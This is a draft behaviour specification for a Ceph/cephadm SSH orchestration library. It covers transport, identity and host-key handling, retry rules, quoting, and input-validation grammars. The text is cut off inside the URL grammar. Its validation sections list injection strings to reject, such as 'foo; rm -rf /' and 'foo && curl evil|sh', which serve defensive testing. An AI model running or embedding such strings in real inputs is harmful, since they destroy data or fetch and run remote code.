# 01 — Transport, input grammars, errors, backoff and device resolution

Status: draft for review · Date: 2026-10-14 · Part of the `@randybias/cephadm`
behaviour specification (see `00-overview.md`)

This file defines **no public methods**. It defines the shared contracts that
every SSH-using method of `@randybias/cephadm` relies on. Each contract below
uses the per-method sub-structure where it applies (safety class, purpose,
inputs, behaviour, failure modes, security, why, test obligations).

Public methods named here (`cephHostPrep`, `wipeDiskToRaw`, `cephApplyOsd`,
`cephVerifyDisksRaw`, `cephBootstrap`, `cephDistributeKey`, `cephVerifyPool`,
`cephGetConnBundle` and others) are consumers. Their own behaviour is specified
in the group file the registry (00-overview §5) assigns them.

The words MUST, MUST NOT, SHOULD and MAY are used as in RFC 2119. Where a
requirement implements a decision from 00-overview §6, the decision is cited
inline, e.g. (D3).

## Contents

| § | Contract |
|---|---|
| 1 | Connection arguments |
| 2 | SSH execution |
| 3 | Identity handling |
| 4 | Host-key policy |
| 5 | Timeouts |
| 6 | Privilege escalation |
| 7 | Script and file delivery |
| 8 | cephadm-shell execution |
| 9 | Connection multiplexing |
| 10 | Transport failure taxonomy and retry / re-send rules |
| 11 | Trust boundary and quoting |
| 12 | Input grammars V1–V15 |
| 13 | Error taxonomy and phase-attributed errors |
| 14 | Capped exponential backoff and polling |
| 15 | Serial → stable device path resolution |

---

## 1. Connection arguments

- **Safety class:** n/a (shared argument fragment).
- **Purpose:** one declaration of the connection fields, reused by every
  SSH-using method so that connection behaviour is uniform.

### 1.1 Inputs

Every SSH-using method's argument schema MUST include exactly one shared
declaration of these fields (a single definition spread into every method).

| Name | Type | Required | Default | Constraints | Meaning |
|---|---|---|---|---|---|
| `sshUser` | string | yes | none, never defaulted | V11: POSIX portable username (D1) | login user on the target; MUST hold passwordless sudo for methods that escalate |
| `keyPath` | string, nullish | no | ssh-agent / ssh default identity | V11: absolute local path, no control characters (D2); empty string = absent; mutually exclusive with `privateKey` | path on the control host to a private key file |
| `privateKey` | string, nullish, **sensitive** | no | absent | empty string = absent; mutually exclusive with `keyPath` | OpenSSH private key **content**, normally a vault reference at the call site |
| `strictHostKeyChecking` | enum `yes` / `no`, nullish | no | `yes` | exactly `yes` or `no` | host-key policy for every SSH call the method makes |
| `port` | integer, nullish | no | 22 | 1–65535 | SSH port; workflows MUST pass it explicitly (D57) |

- The host field itself (`host`, `adminHost`, `hosts[]`, …) is **not** part of
  this fragment. Each method validates it with the host-target grammar (V12).
- A method MAY additionally accept a per-call `timeoutMs` budget (for example
  `cephBootstrap`). It is passed to the transport only when given.

### 1.2 Behaviour

- **Null and absent are the same.** Every optional field MUST accept an
  explicit `null` **individually**, not only all together.
  - Why: workflows pass "the input if supplied, otherwise null" for each field,
    and an optional-only field rejects that null only at run time, after
    workflow validation has already passed.
- Accepting null MUST NOT widen the type. A numeric `keyPath`, a string
  `port`, port 0, port 70000, `strictHostKeyChecking: ""` and
  `strictHostKeyChecking: "maybe"` MUST all be rejected. Any other OpenSSH mode
  (for example `accept-new`) MUST be rejected.
- Converting method arguments into a transport target MUST happen in exactly
  one place. It collapses null, undefined and empty string to "absent". The
  transport target never carries a null, and omitted fields are not
  materialised as keys, so defaults stay in the transport alone.
- Host-key policy and port are properties of the **connection**, not of an
  operation. They MUST be accepted uniformly by every SSH-using method.
  - Why: if only some methods accept the opt-out or the port, one task's SSH
    calls can split across two trust policies or two ports.
- `keyPath` and `privateKey` both non-empty MUST be refused at argument
  conversion, before anything is spawned (and again at the transport, §3).

### 1.3 Security

- `privateKey` MUST be marked sensitive on both the inner string and the
  nullish wrapper, because a schema reader may inspect either.

### 1.4 Test obligations

- [ ] Sweep over every SSH-using method → each declares all five fields; a
      method lacking any of them fails the test.
- [ ] Every SSH-using method → `privateKey` is optional, nullish and sensitive.
- [ ] Each optional field set to `null` on its own, others real → accepted; the
      real sibling value survives into the target.
- [ ] All optional fields `null` → target identical to omitting them.
- [ ] Omitted fields → not present as keys in the target.
- [ ] `sshUser` → `user`; `keyPath` and host-key policy threaded; `port` and
      `timeoutMs` passed only when given.
- [ ] Numeric `keyPath`, string `port`, port 0, port 70000,
      `strictHostKeyChecking` of `""`, `maybe`, `accept-new` → rejected.
- [ ] `keyPath` and `privateKey` both set → refused, no spawn.
- [ ] `sshUser` and `keyPath` grammar cases from V11 (D1, D2).

---

## 2. SSH execution

- **Safety class:** n/a (transport). Safety is inherited from the calling
  method.
- **Purpose:** run one remote command on one target and report its outcome.

### 2.1 Behaviour

- Every remote action MUST go through the **system OpenSSH client** (`ssh`),
  spawned as a subprocess. No bundled SSH library is used.
  - Why: bundlers that resolve optional native add-ons statically fail on the
    common JavaScript SSH libraries, and the system client is what operators
    already trust and configure.
- **Key-based authentication only.** There is no password argument, and no
  path that accepts, forwards or reads one. Every call MUST pass
  `-o BatchMode=yes` and `-o PreferredAuthentications=publickey`.
  - Why: ssh must never prompt for a password, passphrase or host-key
    confirmation; a prompt is always a failure to surface, never a wait.
- argv shape, in order:
  1. connection options (`-p <port>`, `-o ...`, `-i ...` where applicable);
  2. `--`;
  3. `<user>@<host>`;
  4. the single remote command string, as the last argument.

  Example: `ssh -p 22 -o BatchMode=yes -o PreferredAuthentications=publickey -o StrictHostKeyChecking=yes -o ConnectTimeout=30 -- admin@node1.example.com 'ceph -s'`
- Optional stdin content is written to the child's stdin exactly and then
  closed.
- The spawner is a dependency seam (00-overview §2). The production spawner
  MUST return an **already-spawned** child whose stdin is piped and writable.
  - Why: a spawner that returns an unspawned command object has no stdin, and
    the first real call crashes.
- Before spawning anything, the transport MUST reject a command string or stdin
  content that contains a NUL byte (§11).
- **Exit codes.**
  - The remote command's own exit code is the result.
  - A non-zero remote exit MUST throw by default, with host, port, user, exit
    code, the command, stdout and stderr in the error.
  - An "allow non-zero" option returns stdout, stderr and exit code instead of
    throwing.
  - An ssh exit of 255, a connection-level failure, or our own timeout abort
    MUST surface as a **typed transport error** (§10), **even when the caller
    allows non-zero exits** (D8). It is never reported as a remote exit code.
  - A remote command's own non-zero exit is never a transport error (D8).

### 2.2 Failure modes

| Condition | Result |
|---|---|
| NUL byte in command or stdin | local refusal, nothing spawned |
| both identities set | local refusal, nothing spawned (§3) |
| ssh exit 255 / connection failure / timeout | typed transport error (§10) |
| remote non-zero, not allowed | remote-exit error (§13) |
| sudo refusal | sudo policy error (§6) |

### 2.3 Security

- No argv element ever contains a password or key material.
- Error messages include host, port and user, never key content.

### 2.4 Test obligations

- [ ] `BatchMode=yes` and `PreferredAuthentications=publickey` on every call.
- [ ] argv ends with `--`, `user@host`, then the exact command.
- [ ] stdin content delivered exactly, then closed.
- [ ] Port absent → `-p 22`; explicit 2222 → `-p 2222`.
- [ ] Non-zero remote exit → throws naming the host; with allow-non-zero →
      returns exit code and stderr.
- [ ] Exit 255 with allow-non-zero set → still a typed transport error (D8).
- [ ] Remote exit 1 → never a transport error (D8).
- [ ] No argv element contains the word "password".
- [ ] Production spawner returns a child with a writable stdin.

---

## 3. Identity handling

- **Purpose:** choose the identity ssh offers, and keep key material off disk
  for as short a time as possible.

### 3.1 Behaviour

- `keyPath` given → pass `-i <path>` and `-o IdentitiesOnly=yes`.
- Neither given → no `-i` and no `IdentitiesOnly`; ssh uses the agent or its
  default identity (still key-only).
- Both given → refuse before spawning, at argument conversion (§1) **and again
  at the transport**. The message says both identities were set and to pass
  exactly one.
- `privateKey` given → for **each** ssh call:
  1. Create a fresh private temporary directory on the control host and force
     its mode to 0700.
  2. Create the key file inside it exclusively, then force mode 0600
     explicitly.
     - Why: the mode given at create time is filtered by the umask.
  3. If the content lacks a trailing newline, append one.
     - Why: OpenSSH rejects a key file without a final newline as an invalid
       format, and vault values often lose it.
  4. Run ssh with `-i <that file>` and `-o IdentitiesOnly=yes`.
  5. Remove the directory afterwards in all cases.
     - If the call failed, the call's own error wins and removal is still
       attempted.
     - If the call succeeded but removal failed, throw.
     - Why: a key left on disk must never pass silently.
- Why inline key content exists at all: a method given only a key path with an
  empty value falls back to the control host's default key, which the target
  refuses; key content from the vault removes that dependency.

### 3.2 Security

- Key material MUST NOT appear in argv, an error message, a log line or a
  resource.

### 3.3 Test obligations

- [ ] `keyPath` set → `-i <path>` and `IdentitiesOnly=yes`; neither set → no
      `-i`, no `IdentitiesOnly`.
- [ ] `privateKey` set → argv has `-i <temp file>` and `IdentitiesOnly=yes`,
      never the key text.
- [ ] At spawn time the file is 0600 and its directory 0700.
- [ ] File content equals key plus one trailing newline (key with and without
      newline).
- [ ] File and directory gone after success, after exit 255, and after a spawn
      that throws.
- [ ] Removal fails after a successful call → throws.
- [ ] Failure messages never contain the key text.
- [ ] Both identities → refused at both layers, zero spawns.
- [ ] Empty string or null for either → treated as absent.

---

## 4. Host-key policy

- **Purpose:** verify every target's host key by default, and explain host-key
  failures precisely.

### 4.1 Behaviour

- Default strict: `-o StrictHostKeyChecking=yes`.
  - Why: Ceph hosts are already provisioned and belong in known_hosts.
- Opt-out `no` is explicit, per call, and SHOULD be justified at the call site
  (for example, a node mid-provisioning whose host key has not been
  distributed). With `no`, the transport MUST also pass
  `-o UserKnownHostsFile=/dev/null` and `-o GlobalKnownHostsFile=/dev/null`.
  - Why: the control host's real known_hosts is then neither consulted nor
    polluted.
- **Host key changed** (OpenSSH's "remote host identification has changed"
  warning). The message MUST say:
  - this is almost always a re-imaged node and **not** a bad credential (ssh
    aborts before authentication, so the credential was never offered);
  - remedy: remove the stale known_hosts entries for both the IP and the
    hostname (they are separate entries) with `ssh-keygen -R`;
  - verify the new fingerprint out of band, because a real man-in-the-middle
    produces the same signature.

  This check MUST run **before** the generic host-key-failure check, because
  both outputs end in the same "verification failed" line.
- **Host key absent.** The message MUST say the target is not in known_hosts,
  and that `no` is only for a target that genuinely has no distributed key yet.
  It MUST NOT mention re-imaging.
- Why: a changed key reported as a credential failure sends an investigation to
  the vault and invites an unnecessary credential rotation.

### 4.2 Test obligations

- [ ] Default → `StrictHostKeyChecking=yes` and no `/dev/null` known-hosts
      options.
- [ ] `no` → `StrictHostKeyChecking=no` plus user and global known-hosts at
      `/dev/null`.
- [ ] Changed-key stderr → message mentions re-imaging, `ssh-keygen -R`, and
      that it is not a bad credential.
- [ ] Absent-key stderr → message mentions known_hosts and does not mention
      re-imaging.

---

## 5. Timeouts

- **Purpose:** bound every call, and report an unreachable host quickly.

### 5.1 Behaviour

- Per-call budget default: 30 s. The whole ssh subprocess MUST be killed at
  budget + 5 s.
- `ConnectTimeout` = the budget in whole seconds, rounded up, minimum 1,
  **capped at 30**. The cap only ever lowers the value.
  - Why: connecting is fast on any reachable host however long the command may
    take; deriving connect time from a 15-minute budget would make an
    unreachable host take 15 minutes to report.
- Every call run inside `cephadm shell` has a budget floor of 5 minutes; a
  larger caller budget wins (D37). A method MAY use a longer default; pool and
  filesystem creation use 10 minutes (D37). Raising a budget to its floor is
  logged at `warn`.
  - Why: each such call starts a container, a no-op read can exceed 30 s on a
    degraded cluster, and killing a filesystem create mid-flight leaves pools
    without a filesystem.
- Our own kill on budget is a typed transport error of kind **aborted** (§10,
  D8), never "dropped".

### 5.2 Test obligations

- [ ] `ConnectTimeout`: 10000 ms → 10; 1000 ms → 1; 1 ms → 1; 900000 ms → 30;
      default → 30.
- [ ] cephadm-shell call with a 30 s budget → runs with 5 min, warns (D37).
- [ ] cephadm-shell call with a 10 min budget → keeps 10 min (D37).
- [ ] Budget exceeded → typed transport error, kind aborted, pre-session cause
      null (D8).

---

## 6. Privilege escalation

- **Purpose:** run a command as root without ever prompting.

### 6.1 Behaviour

- An optional sudo flag prefixes the remote command with `sudo -n --`. The
  orchestration user MUST have **passwordless** sudo.
  - Why: `-n` makes a target whose sudoers would prompt fail at once instead
    of hanging.
- `sudo -n --` runs **one** argv, not a shell line. A sudo-scoped command MUST
  be one simple command, e.g. `sudo -n -- bash /tmp/x.sh` or
  `sudo -n -- apt-get install -y podman`. Callers MUST NOT chain `&&`, `;` or
  `|` after a sudo prefix, because only the first stage would run as root.
  Anything longer is delivered as a script (§7) run under sudo.
- If sudo was requested, the exit is non-zero, and stderr shows sudo's
  "a password is required", "must have a tty" or "a terminal is required"
  refusal, the transport MUST throw a specific **sudo policy error**: passwordless
  sudo is required, fix the target's sudoers, do not retry. This MUST be thrown
  **even when allow-non-zero is set**.
  - Why: the intended command never ran, so returning its "exit code" would be
    a lie.

### 6.2 Test obligations

- [ ] Sudo on → last argv element is `sudo -n -- <command>`.
- [ ] Sudo password refusal → throws "requires a password", also with
      allow-non-zero.

---

## 7. Script and file delivery

- **Purpose:** move multi-line content to a target without putting it on a
  command line.

### 7.1 Behaviour

- **Host-side script (default path).** Pipe the script body over stdin to a
  remote interpreter, so nothing touches the target's disk. Interpreters:
  `bash -s --` (default), `sh -s --`, `python3 -`. With sudo the remote command
  is, for example, `sudo -n -- bash -s --` (still one simple command).
  Allow-non-zero passes through.
- **Remote file write.** Stream the content over stdin to a remote command that
  sets `umask 022`, redirects `cat` into the single-quoted path, then runs
  `chmod` with the single-quoted mode on the single-quoted path. Default mode
  0644; 0700 for an executable script. The file is overwritten. The content
  never appears on a command line. A failing remote write rejects.
- Why two paths: piping over stdin keeps the target's disk clean, but
  `cephadm shell` needs a real file it can mount into the container (§8).

### 7.2 Test obligations

- [ ] Script: default `bash -s --`; `sh -s --`; `python3 -`; with sudo
      `sudo -n -- bash -s --`; body delivered on stdin; non-zero handling as §2.
- [ ] File write: command contains `cat >`, the quoted path, `chmod` and the
      mode; default 0644; content on stdin only; remote failure rejects.

---

## 8. cephadm-shell execution

- **Safety class:** inherited from the caller. Every Ceph command runs this way.
- **Purpose:** run Ceph CLI commands inside `cephadm shell` without nested
  quoting.

### 8.1 Behaviour

1. The method MUST NOT assemble `cephadm shell -- bash -c "..."`.
   - Why: three nested quoting layers break on ordinary caps such as
     `mon 'allow r'`.
2. Create a fresh private directory on the target with `mktemp -d` (mode 0700).
   The script MUST NOT be written directly into a world-writable directory
   (D7).
3. Write the script into that directory (§7 file write, mode 0700, random
   name). Body: `#!/bin/bash`, `set -euo pipefail`, then the commands.
4. Run, under sudo (cephadm needs root):
   `sudo -n -- cephadm shell --mount <dir>:<dir> -- bash <dir>/<script>`
5. Always remove the directory afterwards, best effort (`rm -rf` of that exact
   directory). Removal MUST NOT mask the script's own result or error. A
   removal failure is logged at `warn` (D7).
6. Apply the cephadm-shell budget floor (§5, D37).

- **Single command.** A single ceph command uses the same path with body
  `ceph <args>`.
- **JSON variant.** Appends `-f json` and parses stdout as JSON.
  - A lone human line of the form "No <things> reported" MUST be read as an
    exact empty list.
    - Why: some list commands (for example `ceph orch ls` on a fresh cluster)
      print that instead of `[]`, which breaks idempotency checks.
  - Any other non-JSON output fails with a phase-attributed error containing
    truncated stdout and stderr.

### 8.2 Failure modes

| Condition | Result |
|---|---|
| `mktemp -d` or file write fails | phase-attributed error; nothing ran |
| script exits non-zero | remote-exit error (or returned, if allowed) |
| non-JSON output (JSON variant) | phase-attributed error with truncated output |
| transport loss | typed transport error (§10); retry rules apply |
| directory removal fails | `warn` only |

### 8.3 Test obligations

- [ ] Run command contains `cephadm shell --mount <dir>:<dir> -- bash` and is
      under `sudo -n --`; never `bash -c`.
- [ ] Script directory comes from `mktemp -d` and is not a bare `/tmp/<file>`
      path (D7).
- [ ] Script body starts `#!/bin/bash` then `set -euo pipefail`.
- [ ] Directory removal attempted after success and after failure; a removal
      failure warns and does not replace the script's error (D7).
- [ ] JSON: `No services reported` → `[]`; other non-JSON → error with phase.
- [ ] Caps containing single quotes reach ceph unchanged.

---

## 9. Connection multiplexing

- **Purpose:** reuse one SSH connection for many sequential commands to one
  host. Opt-in, off by default.

### 9.1 Behaviour

- When a caller opts in (for example host preparation followed by bootstrap,
  or a disk wipe, D18), add `ControlMaster=auto`, `ControlPath=<socket>`,
  `ControlPersist=<seconds>` (default 600), `ServerAliveInterval=15` and
  `ServerAliveCountMax=3`. These options are added only when multiplexing is on
  **and** a socket path was resolved.
- Why the keepalive applies only here: a multiplexed channel bypasses
  `ConnectTimeout`, so a master whose TCP path is blackholed would hold every
  later call for its whole budget. With the keepalive the master dies in about
  45 s, and pending channels see exit 255 as a mid-session loss (not re-sent,
  §10).
- **Socket path:** `<base>/<12 hex characters of SHA-1 of "user@host:port">.sock`.
  - The base is `$XDG_RUNTIME_DIR`, else `$TMPDIR`, else `/tmp`, each with a
    namespace subdirectory specific to this extension, so sockets never collide
    with other SSH tooling.
  - If the full path would exceed 103 bytes (the portable UNIX socket path
    limit), fall back to the namespace under `/tmp`.
  - The path is stable for the same target and differs when user, host or port
    differ.
- **Socket directory:** create recursively with mode 0700 (idempotent). If it
  already exists with any group or world permission bits, refuse to multiplex
  with an error telling the operator to fix the permissions or relocate the
  base directory. Skip the check on platforms without permission bits.
  - Why: a shared socket directory lets another local user ride an
    authenticated connection.
- **Explicit close:** a best-effort close runs
  `ssh -O exit -o ControlPath=<socket> -p <port> user@host`, with **no remote
  command** (the destination is the last argv element). It never throws:
  - multiplexing off → no-op that spawns nothing, reported as "not closed,
    multiplex off";
  - exit 0 → closed;
  - non-zero (normal when no master is listening) → not closed, with exit code
    and stderr in the detail;
  - spawn throws → not closed, with the error text.

  It is meant to run in a `finally`, so a close failure never masks the
  method's own error. A close failure is logged at `warn`.

### 9.2 Test obligations

- [ ] Socket path stable, ends `.sock`, differs per user, host and port.
- [ ] Over-long base → falls back under `/tmp`.
- [ ] Socket directory created 0700, idempotent; pre-existing 0777 directory →
      refused with a group/world permissions error.
- [ ] ControlMaster and ServerAlive options absent unless multiplexing is on
      and a path is given; persist configurable (e.g. 120), default 600.
- [ ] Close without multiplexing → zero spawns.
- [ ] Close with multiplexing → exactly one `-O exit` spawn whose last argument
      is `user@host`; non-zero → not closed, detail contains `255`; spawn throws
      → not closed, detail contains the error text.

---

## 10. Transport failure taxonomy and retry / re-send rules

- **Purpose:** tell every caller whether the remote command may have run, so a
  write is re-sent only when it provably did not.

### 10.1 The typed transport error

On ssh exit 255, a connection-level failure, or our own timeout abort, the
transport MUST throw a **typed** transport error (a distinct error type, not
just message text) (D8). It carries:

- the host;
- a **kind** (table below);
- an optional **pre-session cause**.

Its message is human readable and MUST always include `host:port` (port shown
as 22 when omitted) and the user.

- Why: where one address fronts several hosts on different ports, a message
  naming only the address reads as "dialled the wrong machine".

### 10.2 Kinds

| Kind | Meaning | May a write be re-sent? |
|---|---|---|
| **dropped before authentication** | One of OpenSSH's own pre-session drop lines: a line **beginning** with the `kex_exchange_identification` failure prefix, or a line beginning "Connection timed out during banner exchange". Typically sshd `MaxStartups` throttling under concurrent fan-out. Proves nothing ran. | Yes. |
| **aborted** | We killed the session on our budget. The command may still be running on the target. | No. Re-read target state first. |
| **other transport** | Everything else, explicitly including a mid-session loss. | No. Re-read target state first. |

### 10.3 Pre-session cause

Independent of kind. A non-null cause proves the remote command never ran, so a
caller reporting an exhausted retry budget names the cause in words ("bad key",
"refused", "unresolvable name") instead of a generic transport failure. Each
pattern MUST be anchored to the **start of a line**, case-insensitive:

| Cause | Line shape |
|---|---|
| connect-refused | `ssh: connect to host H port P: Connection refused` |
| name-resolution | `ssh: Could not resolve hostname ...` |
| connect-timeout | `ssh: connect to host H port P:` followed by connection timed out, operation timed out, no route to host, or network is unreachable; or the banner-exchange timeout line |
| negotiation | `Unable to negotiate with H port P: no matching ...`, or a line beginning with the `kex_exchange_identification` prefix |
| auth | `user@host: Permission denied (publickey...` |
| null | everything else, including every mid-session loss and our own abort |

### 10.4 Human cause text

Checked in this order; the first match wins:

1. any "permission denied" → authentication failed;
2. host key changed (§4);
3. host key verification failed, key absent (§4);
4. dropped-before-authentication lines → "closed by the remote host before the
   command ran; nothing executed; not evidence about the command's own
   outcome";
5. mid-session loss → "session lost after it may have been established; the
   command MAY HAVE RUN; do not re-send blindly; re-read the target's state".
   Triggers, each anchored at line start:
   - `Connection to H closed by remote host.`
   - `Read from remote host H: Connection reset by peer`
   - `client_loop: send disconnect: Broken pipe`
   - a bare `Connection closed by H port P` or `Connection reset by H port P`
     not preceded by a `kex_exchange_identification` line;

   and also any line **containing** "connection reset by peer" (covers a remote
   tool echoing it mid-line);
6. connection refused; connection or operation timed out; no matching
   kex/hostkey/cipher/mac (algorithm negotiation failed, quoting the first
   stderr line); could not resolve hostname; identity file not found on the
   control host;
7. otherwise the raw stderr, or a generic "ssh failed (exit 255)".

Why anchoring matters:

- Remote stderr shares the stream. A remote tool printing
  "...connection reset by peer (kex_exchange_identification)" mid-line MUST NOT
  be classified as a pre-authentication drop.
- OpenSSH 8 and later print the bare "Connection closed/reset by H port P" for
  both a pre-authentication close and a mid-session packet error. Alone they
  are ambiguous and MUST be treated as mid-session. Only a preceding
  `kex_exchange_identification` line makes them pre-session.
- sshd's server-side `[preauth]` journal suffix is never printed by the client
  and MUST NOT be relied on.

### 10.5 Retry and re-send rules (binding on every consumer)

- **Writes.** After a **dropped-before-authentication** failure a write MAY be
  re-sent (with backoff, §14). After **any other** transport failure (aborted,
  other transport, mid-session loss) a write MUST NOT be re-sent; the method
  fails with a phase ending `-outcome-unknown` whose message says the outcome
  is unknown and to re-read target state. This applies to every step of
  `wipeDiskToRaw` (D18) and to commands such as `mdadm --zero-superblock` and
  `ceph orch host maintenance exit`.
  - Why: re-sending after a mid-session loss can stack an `apt-get install`
    behind one that is already running.
- **Reads.** In a read-only poll, any transport error MAY be retried, because
  repeating a read is harmless.
- **Poll loops retry only transport errors** (D47). An evaluator refusal (for
  example "state not observed", a policy refusal, a parse failure) MUST stop
  the loop at once.
- **Remote non-zero exits** are not transport losses. A method MAY give its
  command's own exit codes a separate, method-specific retry path (for example
  a busy device, D10).
- **Bootstrap recovery** runs only after a transport error, never after a
  non-zero exit (D22; see 03-lifecycle).
- A retried transport blip is logged at `warn`.
- Why the split matters: under concurrent fan-out, sessions dropped before
  authentication were once reported as "package install failed", sending the
  operator to the package mirrors for a command that never ran.

### 10.6 Test obligations

- [ ] Exit 255 with a publickey denial → "authentication failed", kind other
      transport, cause auth; message contains `host:2202` for port 2202 and
      `host:22` when omitted.
- [ ] Exit 255 with broken pipe → kind other transport, cause null.
- [ ] Each line shape in §10.3 → its cause; mid-session lines and a mid-line
      remote echo → null.
- [ ] Dropped-before-authentication positives: `kex_exchange_identification`
      reset; `kex_exchange_identification` close followed by a bare
      "Connection closed by H port 22"; banner-exchange timeout; a `kex` line
      preceded by a "Permanently added ... to the list of known hosts" warning.
      Each → "before the command ran", never "may have run".
- [ ] Negatives (→ "may have run, re-read"): closed by remote host; read reset
      by peer; broken pipe; bare closed-by-port; bare reset-by-port; a remote
      `E:` line containing both signatures mid-line.
- [ ] Authentication denial → neither dropped nor may-have-run. Unknown stderr
      → no classification.
- [ ] Our own timeout → kind aborted (D8).
- [ ] Write step with a dropped-before-authentication failure, then success →
      re-sent once, method succeeds, `warn` logged.
- [ ] Write step with a mid-session loss → not re-sent; phase ends
      `-outcome-unknown`.
- [ ] Poll loop: transport error → retried; evaluator refusal → loop stops
      immediately, no further reads (D47).

---

## 11. Trust boundary and quoting

- **Purpose:** state exactly where untrusted values are stopped.

### 11.1 Behaviour

- Command strings, script bodies and ceph argument tails are **shell content**,
  trusted like `eval`. The transport does **not** escape, allowlist or strip
  metacharacters; quotes, `&&`, pipes, `$()` and `*` are legitimate in caps and
  scripts.
- The only content check in the transport is the NUL-byte refusal (§2). A NUL
  is never legitimate and is a classic truncation-smuggling primitive.
- The real boundary is each method's argument schema. Every field that reaches
  a command MUST be validated with its grammar (§12) before assembly.
- A value that did not pass the method's own schema (read from a resource
  another method wrote, or from a remote host) MUST be re-validated at the point
  of assembly with the runtime form of the same grammar.
- Wherever a value may legitimately contain spaces, quotes or other
  shell-significant characters, both validation **and** quoting are required;
  neither alone suffices.
- **POSIX single-quoting:** wrap in single quotes, replacing each embedded
  single quote with close-quote, backslash, quote, reopen-quote. Every other
  character is left untouched inside the quotes. The result MUST round-trip
  byte-for-byte through real bash.

### 11.2 Test obligations

- [ ] NUL in command or stdin → rejected, zero spawns; `&&`, quotes and caps
      accepted.
- [ ] Quoting: `hello` → `'hello'`; `it's` → `'it'\''s'`; a caps value with
      `*` and `=` unchanged inside quotes.
- [ ] A value containing single and double quotes round-trips exactly through
      `bash -c 'printf %s ...'`.

---

## 12. Input grammars V1–V15

Every field kind has **two forms built from one rule**:

- a **schema form**, the earliest gate, in the method's argument schema; its
  rejection message names the field;
- a **runtime assertion form**, re-checked at assembly. It throws a
  phase-`validate` error (§13) naming the field, the rejected value (truncated
  to about 100 characters) and the rule in words, and returns the value
  unchanged on success.

**Shared must-reject battery** (applies to V1–V15 unless a grammar says
otherwise): `foo; rm -rf /`, `foo && curl evil|sh`, `` foo`whoami` ``,
`foo$(whoami)`, `foo|sh`, `foo<newline>rm -rf /`, `foo & sleep 5`,
`foo > /etc/passwd`, `foo < /etc/passwd`, `foo\bar`.

Every grammar has a test listing its accepts and rejects, plus the battery.

### V1. Ceph identifier, create direction

Used for names a caller creates: pools, CephFS volumes, client entities,
application names, CRUSH rule names, EC profile names.

- 1–128 characters (a defensive bound, not a Ceph limit).
- ASCII letters, digits, dot, underscore, hyphen.
- First character a letter or digit (no leading dot: Ceph reserves dot-prefixed
  names; no leading hyphen or underscore).
- Accept: `rbd_vm`, `cephfs`, `csi-rbd-provisioner`, `csi-rbd-node`,
  `csi-cephfs-provisioner`, `csi-cephfs-node`, `client.admin`,
  `cephfs.cephfs.data`, `cephfs.cephfs.meta`, `ec_k3_m2_host`, `host_rule`.
- Reject: `.mgr`, `.rgw.root`, `-rbd_vm`, `_rbd_vm`, `../../etc/passwd`,
  `rbd vm`, empty, `foo; curl evil | sh`, `foo $(id)`, `` foo `id` ``,
  `foo|sh`, `foo>out`, `foo&`, `foo<newline>bar`, 129 characters.
- Safe to interpolate bare once validated.

### V2. Ceph identifier, reference direction

Used for names looked up or asserted against existing state (e.g.
`cephVerifyPool`, `cephGetConnBundle`).

- As V1, except the first character MAY also be a dot, and the value MUST NOT
  consist only of dots.
- Accept: all V1 accepts, plus `.mgr` and `.rgw.root`.
- Reject: `-rbd_vm`, `_rbd_vm`, `../../etc/passwd`, `.`, `..`,
  `../../../.mgr`, empty, `.foo; id`, the battery.
- Why two rules: one strict rule false-rejects real cluster state such as
  `.mgr`; one permissive rule lets callers create reserved-looking names.

### V3. Ceph caps expression (mon, mgr, osd, mds caps)

- 1–512 characters.
- Allowed: letters, digits, space, single quote, double quote, `=`, `*`, `/`,
  comma, dot, underscore, hyphen. Everything else is rejected, notably
  backtick, `$`, `;`, `&`, `|`, newline, `<`, `>`, `(`, `)`, backslash.
- Accept: `profile rbd`, `allow r`, `allow rw`,
  `allow rw tag cephfs metadata=*`, `allow rw tag cephfs *=*`,
  `allow rw pool=liverpool`,
  `allow rw pool=liverpool namespace=namespace-name`, `profile bootstrap-mds`,
  `profile rbd-read-only`, `allow rw path=/data`,
  `allow r, allow rw pool=liverpool`.
- Reject: each forbidden character appended singly to a valid caps string;
  `allow r; id`, `allow r $(id)`, `` allow r `id` ``, `allow r | sh`,
  `allow r && id`, `allow r<newline>id`, `allow r > /etc/x`; empty.
- Validation is not sufficient: the value MUST also be single-quoted at
  assembly (§11).

### V4. Device serial

Selects disks for destructive wipe and OSD claim.

- 1–40 characters (a defensive superset of the NVMe 20-byte serial field).
- ASCII letters, digits and hyphen only.
- Accept: `SN000000000A`, `S0EXAMPLE00001`, `PH0000000000XA`, `A1-B2-C3`.
- Reject: 41 characters, 64 characters, empty, `SN_0001`, `SN.0001`,
  `SN 0001`, `*`, the battery.
- Why so narrow: an unusual manufacturer format must fail loudly and be widened
  deliberately, never pass silently.

### V5. Hostname

- 1–253 characters; one or more dot-separated labels; each label 1–63
  characters of letters, digits and hyphens, starting and ending with a letter
  or digit (RFC 1123). A single unqualified label is valid.
- Accept: `node1`, `node1.example.com`, `a.b.c.example.com`, `ceph-mon-1.test`.
- Reject: `-node1`, `node1-`, `node1..example.com`, `node_1`, a 64-character
  label, empty, the battery.

### V6. Placement host list

- A non-empty list; every entry a V12 host target; no duplicates.
  - Why: a repeated host asks for two daemons in one failure domain while
    looking like redundancy, and is the typical shape of a templating bug.
- No minimum beyond one: redundancy floors are cluster policy and must not
  block a single-daemon recovery.
- Accept: `[node1]`, `[node1, node2, node3]`.
- Reject: `[]`, `[node1, node1]`, `[node1, "node2; id"]`.

### V7. IPv4 address

- Exactly four dot-separated decimal octets, each 0–255, no leading zeros (a
  single `0` is fine).
- IPv6 is out of scope. A value containing a colon MUST be refused with a
  message saying IPv6 is not supported, not merely "invalid" (D9).
- Accept: `203.0.113.20`, `198.51.100.22`, `192.0.2.0`, `203.0.113.255`.
- Reject: `999.999.999.999`, `203.0.113.256`, `0203.0.113.20` (octal
  confusion), `203.0.113.020`, `203.0.113`, `203.0.113.20.1`, empty, the
  battery; `2001:db8::1` and `::ffff:192.0.2.1` → the IPv6 message (D9).

### V8. HTTP(S) URL

Used for, e.g., the cephadm download URL, which is fetched into a root-owned
executable.

- MUST parse as an absolute URL whose scheme is exactly `http` or `https`.
  `file:`, `ftp:` and `data:` parse and MUST be rejected explicitly;
  scheme-relative and schemeless strings fail to parse.
- The **raw** input (not the parsed form) MUST contain none of `;` `&` `|`
  backtick `$` `(` `)` `<` `>` backslash, nor any whitespace.
  - Why: URL parsers encode spaces and silently strip embedded newlines, so a
    check on the normalised form misses smuggled content.
- Consequence: multi-parameter query strings (which need `&`) are unsupported;
  a single parameter is fine.
- Accept: `https://download.example.com/ceph/cephadm`,
  `https://git.example.com/ceph/raw/v19.2.3/src/cephadm/cephadm`,
  `https://download.example.com:8443/cephadm?version=19.2.3`.
- Reject: `http://x/f; curl evil | sh`, `http://x/f $(id)`,
